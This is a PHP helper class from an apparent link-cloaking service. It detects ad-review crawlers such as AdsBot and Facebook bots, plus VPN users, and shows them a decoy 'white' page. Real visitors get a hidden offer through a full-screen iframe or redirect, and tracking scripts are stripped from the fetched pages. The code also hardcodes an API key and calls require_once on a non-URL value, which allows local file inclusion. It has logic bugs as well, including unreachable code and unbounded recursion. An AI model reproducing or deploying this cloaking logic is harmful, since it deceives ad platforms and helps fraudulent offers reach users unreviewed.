<?php

namespace App;

use Monolog\Logger;
use Monolog\Handler\StreamHandler;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Redis;

class Helper
{
    public static function countryList(): array
    {
        return [
            'AF' => 'Afghanistan',
            'AL' => 'Albania',
            'DZ' => 'Algeria',
            'AS' => 'American Samoa',
            'AD' => 'Andorra',
            'AO' => 'Angola',
            'AI' => 'Anguilla',
            'AQ' => 'Antarctica',
            'AG' => 'Antigua and Barbuda',
            'AR' => 'Argentina',
            'AM' => 'Armenia',
            'AW' => 'Aruba',
            'AU' => 'Australia',
            'AT' => 'Austria',
            'AZ' => 'Azerbaijan',
            'BS' => 'Bahamas',
            'BH' => 'Bahrain',
            'BD' => 'Bangladesh',
            'BB' => 'Barbados',
            'BY' => 'Belarus',
            'BE' => 'Belgium',
            'BZ' => 'Belize',
            'BJ' => 'Benin',
            'BM' => 'Bermuda',
            'BT' => 'Bhutan',
            'BO' => 'Bolivia',
            'BA' => 'Bosnia and Herzegovina',
            'BW' => 'Botswana',
            'BR' => 'Brazil',
            'IO' => 'British Indian Ocean Territory',
            'BN' => 'Brunei Darussalam',
            'BG' => 'Bulgaria',
            'BF' => 'Burkina Faso',
            'BI' => 'Burundi',
            'CV' => 'Cabo Verde',
            'KH' => 'Cambodia',
            'CM' => 'Cameroon',
            'CA' => 'Canada',
            'KY' => 'Cayman Islands',
            'CF' => 'Central African Republic',
            'TD' => 'Chad',
            'CL' => 'Chile',
            'CN' => 'China',
            'CO' => 'Colombia',
            'KM' => 'Comoros',
            'CG' => 'Congo',
            'CD' => 'Congo (DRC)',
            'CR' => 'Costa Rica',
            'CI' => 'Côte d’Ivoire',
            'HR' => 'Croatia',
            'CU' => 'Cuba',
            'CY' => 'Cyprus',
            'CZ' => 'Czech Republic',
            'DK' => 'Denmark',
            'DJ' => 'Djibouti',
            'DM' => 'Dominica',
            'DO' => 'Dominican Republic',
            'EC' => 'Ecuador',
            'EG' => 'Egypt',
            'SV' => 'El Salvador',
            'GQ' => 'Equatorial Guinea',
            'ER' => 'Eritrea',
            'EE' => 'Estonia',
            'SZ' => 'Eswatini',
            'ET' => 'Ethiopia',
            'FJ' => 'Fiji',
            'FI' => 'Finland',
            'FR' => 'France',
            'GA' => 'Gabon',
            'GM' => 'Gambia',
            'GE' => 'Georgia',
            'DE' => 'Germany',
            'GH' => 'Ghana',
            'GR' => 'Greece',
            'GL' => 'Greenland',
            'GD' => 'Grenada',
            'GU' => 'Guam',
            'GT' => 'Guatemala',
            'GN' => 'Guinea',
            'GW' => 'Guinea-Bissau',
            'GY' => 'Guyana',
            'HT' => 'Haiti',
            'HN' => 'Honduras',
            'HK' => 'Hong Kong',
            'HU' => 'Hungary',
            'IS' => 'Iceland',
            'IN' => 'India',
            'ID' => 'Indonesia',
            'IR' => 'Iran',
            'IQ' => 'Iraq',
            'IE' => 'Ireland',
            'IL' => 'Israel',
            'IT' => 'Italy',
            'JM' => 'Jamaica',
            'JP' => 'Japan',
            'JO' => 'Jordan',
            'KZ' => 'Kazakhstan',
            'KE' => 'Kenya',
            'KI' => 'Kiribati',
            'KW' => 'Kuwait',
            'KG' => 'Kyrgyzstan',
            'LA' => 'Laos',
            'LV' => 'Latvia',
            'LB' => 'Lebanon',
            'LS' => 'Lesotho',
            'LR' => 'Liberia',
            'LY' => 'Libya',
            'LI' => 'Liechtenstein',
            'LT' => 'Lithuania',
            'LU' => 'Luxembourg',
            'MO' => 'Macao',
            'MG' => 'Madagascar',
            'MW' => 'Malawi',
            'MY' => 'Malaysia',
            'MV' => 'Maldives',
            'ML' => 'Mali',
            'MT' => 'Malta',
            'MH' => 'Marshall Islands',
            'MR' => 'Mauritania',
            'MU' => 'Mauritius',
            'MX' => 'Mexico',
            'FM' => 'Micronesia',
            'MD' => 'Moldova',
            'MC' => 'Monaco',
            'MN' => 'Mongolia',
            'ME' => 'Montenegro',
            'MA' => 'Morocco',
            'MZ' => 'Mozambique',
            'MM' => 'Myanmar',
            'NA' => 'Namibia',
            'NR' => 'Nauru',
            'NP' => 'Nepal',
            'NL' => 'Netherlands',
            'NZ' => 'New Zealand',
            'NI' => 'Nicaragua',
            'NE' => 'Niger',
            'NG' => 'Nigeria',
            'MK' => 'North Macedonia',
            'NO' => 'Norway',
            'OM' => 'Oman',
            'PK' => 'Pakistan',
            'PW' => 'Palau',
            'PA' => 'Panama',
            'PG' => 'Papua New Guinea',
            'PY' => 'Paraguay',
            'PE' => 'Peru',
            'PH' => 'Philippines',
            'PL' => 'Poland',
            'PT' => 'Portugal',
            'QA' => 'Qatar',
            'RO' => 'Romania',
            'RU' => 'Russia',
            'RW' => 'Rwanda',
            'KN' => 'Saint Kitts and Nevis',
            'LC' => 'Saint Lucia',
            'VC' => 'Saint Vincent and the Grenadines',
            'WS' => 'Samoa',
            'SM' => 'San Marino',
            'ST' => 'Sao Tome and Principe',
            'SA' => 'Saudi Arabia',
            'SN' => 'Senegal',
            'RS' => 'Serbia',
            'SC' => 'Seychelles',
            'SL' => 'Sierra Leone',
            'SG' => 'Singapore',
            'SK' => 'Slovakia',
            'SI' => 'Slovenia',
            'SB' => 'Solomon Islands',
            'SO' => 'Somalia',
            'ZA' => 'South Africa',
            'KR' => 'South Korea',
            'SS' => 'South Sudan',
            'ES' => 'Spain',
            'LK' => 'Sri Lanka',
            'SD' => 'Sudan',
            'SR' => 'Suriname',
            'SE' => 'Sweden',
            'CH' => 'Switzerland',
            'SY' => 'Syria',
            'TW' => 'Taiwan',
            'TJ' => 'Tajikistan',
            'TZ' => 'Tanzania',
            'TH' => 'Thailand',
            'TL' => 'Timor-Leste',
            'TG' => 'Togo',
            'TO' => 'Tonga',
            'TT' => 'Trinidad and Tobago',
            'TN' => 'Tunisia',
            'TR' => 'Turkey',
            'TM' => 'Turkmenistan',
            'TV' => 'Tuvalu',
            'UG' => 'Uganda',
            'UA' => 'Ukraine',
            'AE' => 'United Arab Emirates',
            'GB' => 'United Kingdom',
            'US' => 'United States',
            'UY' => 'Uruguay',
            'UZ' => 'Uzbekistan',
            'VU' => 'Vanuatu',
            'VE' => 'Venezuela',
            'VN' => 'Vietnam',
            'YE' => 'Yemen',
            'ZM' => 'Zambia',
            'ZW' => 'Zimbabwe',
        ];
    }
    public static function platform($method = 'device' , $ua)
    {
        $user_agent = $ua;
        $platform = 'Unknown';
        $os_array = array(
            '/windows nt 10/i'      =>  'Windows 10',
            '/windows nt 6.3/i'     =>  'Windows 8.1',
            '/windows nt 6.2/i'     =>  'Windows 8',
            '/windows nt 6.1/i'     =>  'Windows 7',
            '/windows nt 6.0/i'     =>  'Windows Vista',
            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
            '/windows nt 5.1/i'     =>  'Windows XP',
            '/windows xp/i'         =>  'Windows XP',
            '/windows nt 5.0/i'     =>  'Windows 2000',
            '/windows me/i'         =>  'Windows ME',
            '/win98/i'              =>  'Windows 98',
            '/win95/i'              =>  'Windows 95',
            '/win16/i'              =>  'Windows 3.11',
            '/macintosh|mac os x/i' =>  'Mac OS X',
            '/mac_powerpc/i'        =>  'Mac OS 9',
            '/linux/i'              =>  'Linux',
            '/ubuntu/i'             =>  'Ubuntu',
            '/iphone/i'             =>  'iPhone',
            '/ipod/i'               =>  'iPod',
            '/ipad/i'               =>  'iPad',
            '/android/i'            =>  'Android',
            '/blackberry/i'         =>  'BlackBerry',
            '/webos/i'              =>  'Mobile',
            '/FBA[NV]|instagram/i'  =>  'FBBrowser'
        );
        foreach ($os_array as $regex => $value) {
            if (preg_match($regex, $user_agent)) {
                $platform = $value;
            }
        }
        if ($method == 'device') {
            if (preg_match('/windows|mac|linux/i', $platform)) {
                $platform = 'desktop';
            }
            if (preg_match('/iphone|ipod|ipad|android/i', $platform)) {
                $platform = 'mobile';
            }
            if (preg_match('/FBA[NV]|instagram/i', $platform)) {
                $platform = 'FBBrowser';
            }
        } elseif ($method == 'platform') {
            if (preg_match('/windows/i', $platform)) {
                $platform = 'windows';
            }
            if (preg_match('/mac/i', $platform)) {
                $platform = 'macos';
            }
            if (preg_match('/android/i', $platform)) {
                $platform = 'android';
            }
            if (preg_match('/linux/i', $platform)) {
                $platform = 'linux';
            }
            if (preg_match('/ubuntu/i', $platform)) {
                $platform = 'ubuntu';
            }
            if (preg_match('/blackberry/i', $platform)) {
                $platform = 'blackberry';
            }
            if (preg_match('/FBA[NV]|instagram/i', $platform)) {
                $platform = 'FBBrowser';
            }
        } else {
            $platform = $platform;
        }

        return $platform;
    }

    public static function ip()
    {

        $ipaddress = '';

        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED'])) {
            $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
        } elseif (!empty($_SERVER['HTTP_FORWARDED_FOR'])) {
            $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
        } elseif (!empty($_SERVER['HTTP_FORWARDED'])) {
            $ipaddress = $_SERVER['HTTP_FORWARDED'];
        } elseif (!empty($_SERVER['REMOTE_ADDR'])) {
            $ipaddress = $_SERVER['REMOTE_ADDR'];
        } else {
            $ipaddress = 'unknown';
        }

        if ($ipaddress == '127.0.0.1' || $ipaddress == '::1' || $ipaddress == 'unknown') {
            return '8.8.8.8';
        }
        $ipaddress = explode(',', $ipaddress);
        return trim($ipaddress[0]);

        if (filter_var($ipaddress, FILTER_VALIDATE_IP)) {
            return $ipaddress;
        }



        return 'unknown';
    }

    public static function country($ip, $codeOnly = true)
    {
        $sessionHash = md5($ip);
        if (isset($_SESSION[$sessionHash])) {
            return $_SESSION[$sessionHash];
        } else {

            $url = 'http://pro.ip-api.com/json/' . $ip . '?fields=21229567&key=LlYVGewz67LJuV8';
            $data = self::http($url);
            $data = json_decode($data, true);
            if ($data['status'] == 'success') {
                if ($codeOnly) {
                    return $data['countryCode'];
                } else {
                    return $data;
                }
                $_SESSION[$sessionHash] = $data;
            } else {
                self::country($ip, $codeOnly);
            }
        }
    }
    public static function http($url)
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        $result = curl_exec($ch);
        curl_close($ch);
        return $result;
    }
    public static function render_iframe($url)
    {
        $html =  "<html><head><title></title></head><body style='margin: 0; padding: 0;'><meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0\"/><iframe src='" . $url . "' style='visibility:visible !important; position:absolute; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;' allowfullscreen='allowfullscreen' webkitallowfullscreen='webkitallowfullscreen' mozallowfullscreen='mozallowfullscreen'></iframe></body></html>";
        return $html;
    }
    public static function render_offer($offer, $utm = false, $method = 'iframe')
    {

        if (strpos($offer, ",") !== false) {
            $combo = explode(",", $offer);
            shuffle($combo);
            $offer = $combo[0];
        } else {
            $offer = $offer;
        }
        if (substr($offer, 0, 8) == 'https://' || substr($offer, 0, 7) == 'http://') {
            if (!empty($_GET) && $utm) {
                if (strstr($offer, '?')) $offer .= '&' . http_build_query($_GET);
                else $offer .= '?' . http_build_query($_GET);
            }
            if ($method == '302') {
                header("HTTP/1.1 302 Found");
                header("Location: " . $offer);
                exit();
            } else if ($method == 'iframe') {
                echo "<html><head><title></title></head><body style='margin: 0; padding: 0;'><meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0\"/><iframe src='" . $offer . "' style='visibility:visible !important; position:absolute; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;' allowfullscreen='allowfullscreen' webkitallowfullscreen='webkitallowfullscreen' mozallowfullscreen='mozallowfullscreen'></iframe></body></html>";
            } else if ($method == 'meta') {
                echo '<html><head><meta http-equiv="Refresh" content="0; URL=' . $offer . '" ></head></html>';
            }
        } else {
            require_once($offer);
            die();
        }
    }
    public static function render_bot($botss, $method = 'curl')
    {
        if ($method === 'lorem') {
            header('Content-Type: text/html; charset=UTF-8');
            echo "<!DOCTYPE html>
             <html lang='en'>
             <head>
                 <meta charset='UTF-8'>
                 <meta name='viewport' content='width=device-width, initial-scale=1.0'>
                 <title>Lorem Ipsum</title>
             </head>
             <body>
                 <h1>Lorem Ipsum</h1>
                 <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.</p>
             </body>
             </html>";
            exit;
        }

        if (substr($botss, 0, 8) == 'https://' || substr($botss, 0, 7) == 'http://') {
            if ($method == '302') {
                header("HTTP/1.1 302 Found");
                header("Location: " . $botss);
                exit();
            } else {
                if (!function_exists('curl_init')) {
                    $page = file_get_contents($botss, 'r', stream_context_create(array('ssl' => array('verify_peer' => false, 'verify_peer_name' => false,))));
                } else {
                    $page = self::http($botss);
                }
                $page = preg_replace('#(<head[^>]*>)#imU', '$1<base href="' . $botss . '">', $page, 1);
                $page = preg_replace('#https://connect\.facebook\.net/[a-zA-Z_-]+/fbevents\.js#imU', '', $page);

                if (empty($page)) {
                    header("HTTP/1.1 503 Service Unavailable", true, 503);
                }
                echo $page;
            }
        } else {
            require_once($botss);
            die();
        }
    }
    public static function is_vpn($ip)
    {
        $session = sha1('is_vpn' . $ip);
        if (isset($_SESSION[$session])) {
            return $_SESSION[$session];
        } else {
            $url = "https://blackbox.ipinfo.app/lookup/{$ip}";

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36");
            curl_setopt($ch, CURLOPT_TIMEOUT, 30);
            $response = curl_exec($ch);

            if (curl_errno($ch)) {
                curl_close($ch);
                return false;
            }
            curl_close($ch);

            if ($response === 'N') {
                $_SESSION[$session] = false;
                return false;
            } else {
                $_SESSION[$session] = true;
                return true;
            }
        }
    }

    public static function render_white($white, $method = 'curl')
    {
        if (substr($white, 0, 8) == 'https://' || substr($white, 0, 7) == 'http://') {
            if ($method == '302') {
                header("HTTP/1.1 302 Found");
                header("Location: " . $white);
                exit();
            } else {
                if (!function_exists('curl_init')) $page = file_get_contents($white, 'r', stream_context_create(array('ssl' => array('verify_peer' => false, 'verify_peer_name' => false,))));
                else $page = self::http($white);
                $page = preg_replace('#(<head[^>]*>)#imU', '$1<base href="' . $white . '">', $page, 1);
                $page = preg_replace('#https://connect\.facebook\.net/[a-zA-Z_-]+/fbevents\.js#imU', '', $page);

                if (empty($page)) {
                    header("HTTP/1.1 503 Service Unavailable", true, 503);
                }
                echo $page;
            }
        } else {
            require_once($white);
            die();
        }
    }

    public static function is_bot_crawlers($useragent)
    {

        if (preg_match('/bot|crawl|slurp|spider|mediapartners|WhatsApp|Google-Ads-Creatives-Assistant|Google-Adwords-Instant|adsbot|AdsBot-Google|AdsBot-Google-Mobile|GoogleOther|facebookexternalhit|Facebookbot|Facebot|Googlebot|Googlebot-Image|Googlebot-News|Googlebot-Video|Googlebot-Mobile|Mediapartners-Google|AdsBot-Google-Mobile-Apps|Bingbot|DuckDuckBot|Baiduspider|YandexBot|Sogou|Exabot|facebot|ia_archiver|AhrefsBot|SemrushBot|MJ12bot|DotBot|PetalBot|ZoominfoBot|Pingdom|UptimeRobot|TelegramBot|Twitterbot|LinkedInBot|Pinterestbot|DiscordBot|Snapchat|WeChatbot|BLEXBot|CocCocBot|SEOkicks|Amazonbot|AlexaBot|YandexImages|SiteAuditBot|Google-Read-Aloud|AdsBot-Google-Mobile-Apps|GTMetrix|AppEngine-Google|HubSpot|serpstatbot|SeznamBot|Datanyze|MegaIndex|OpenLinkProfiler|okhttp/i', $useragent)) {
            return true; // It's a bot
        } else {
            return false; // It's not a bot
        }
    }

    public static function has_referer($referer)
    {
        if (isset($_SERVER['HTTP_REFERER'])) {
            $referer = $_SERVER['HTTP_REFERER'];
            return true;
        } else {
            return false;
        }
    }
    public static function get_referer()
    {
        if (isset($_SERVER['HTTP_REFERER'])) {
            $referer = $_SERVER['HTTP_REFERER'];
            return $referer;
        } else {
            return false;
        }
    }
    // Di dalam controller atau service
   /**
     * Write a single log entry
     */
    public static function write_log($userId, $link_id, $action, $data = [])
    {
        // Instead of writing directly, push to Redis queue for batch processing
        $logData = [
            'time' => now()->timestamp,
            'action' => $action,
            'data' => $data
        ];
        
        $logKey = "logs:{$userId}:{$link_id}";
         Redis::rpush($logKey, json_encode($logData));
        
        // If queue reaches threshold, process in background
        if (Redis::llen($logKey) > 50) {
            self::process_log_queue($userId, $link_id);
        }
    }
    
    /**
     * Process log queue for a specific user and link
     */
    public static function process_log_queue($userId, $link_id)
    {
        $logKey = "logs:{$userId}:{$link_id}";
        
        // Get all logs and clear the Redis list atomically
        $logs = Redis::pipeline(function ($pipe) use ($logKey) {
            $pipe->lrange($logKey, 0, -1);
            $pipe->del($logKey);
        });
        
        if (empty($logs[0])) {
            return;
        }
        
        $logsArray = [];
        foreach ($logs[0] as $logJson) {
            $logsArray[] = json_decode($logJson, true);
        }
        
        // Process the batch
        self::write_logs_batch($userId, $link_id, $logsArray);
    }
    
    /**
     * Write multiple log entries in batch
     */
    public static function write_logs_batch($userId, $link_id, $logsArray)
    {
        if (empty($logsArray)) {
            return;
        }
        
        // Get link information from cache to avoid repeated DB queries
        $linkCacheKey = "link_info:{$link_id}";
        $linkInfo = Cache::remember($linkCacheKey, 3600, function () use ($link_id) {
            $linkModel = \App\Models\Link::find($link_id);
            return [
                'shortlink' => $linkModel->shortlink,
                'user' => $linkModel->user->name,
            ];
        });
        
        // Setup the log file path
        $logPath = storage_path("logs/links/user-{$userId}_link-{$link_id}.log");
        
        // Ensure directory exists
        $directory = dirname($logPath);
        if (!file_exists($directory)) {
            mkdir($directory, 0755, true);
        }
        
        // Create a single logger instance for all entries
        $channel = new Logger("user_{$userId}_link_{$link_id}");
        $handler = new StreamHandler($logPath, Logger::INFO);
        $channel->pushHandler($handler);
        
        // Process all logs in a single batch
        foreach ($logsArray as $log) {
            $action = $log['action'];
            $data = $log['data'];
            $time = isset($log['time']) ? 
                date('Y-m-d H:i:s', $log['time']) : 
                now()->toDateTimeString();
            
            // Log message with context
            $channel->info($action, array_merge([
                'shortlink' => $linkInfo['shortlink'],
                'user' => $linkInfo['user'],
                'timestamp' => $time,
            ], $data));
        }
    }
    
    /**
     * Schedule batch processing of all log queues
     */
    public static function process_all_log_queues()
    {
        // Find all log keys in Redis
        $keys = Redis::keys('logs:*');
        
        foreach ($keys as $key) {
            // Extract user and link IDs from key
            list(, $userId, $linkId) = explode(':', $key);
            
            // Process this queue if it has entries
            if (Redis::llen($key) > 0) {
                self::process_log_queue($userId, $linkId);
            }
        }
    }
    
    /**
     * Schedule a regular cleanup of old logs
     * This can be called from a scheduled command
     */
    public static function cleanup_old_logs($days = 30)
    {
        $cutoff = now()->subDays($days)->timestamp;
        
        // Get all keys for logs
        $logDirs = glob(storage_path('logs/links/*'));
        
        foreach ($logDirs as $dir) {
            $logFiles = glob($dir . '/*.log');
            
            foreach ($logFiles as $file) {
                $lastModified = filemtime($file);
                
                if ($lastModified < $cutoff) {
                    unlink($file);
                }
            }
        }
    }

}
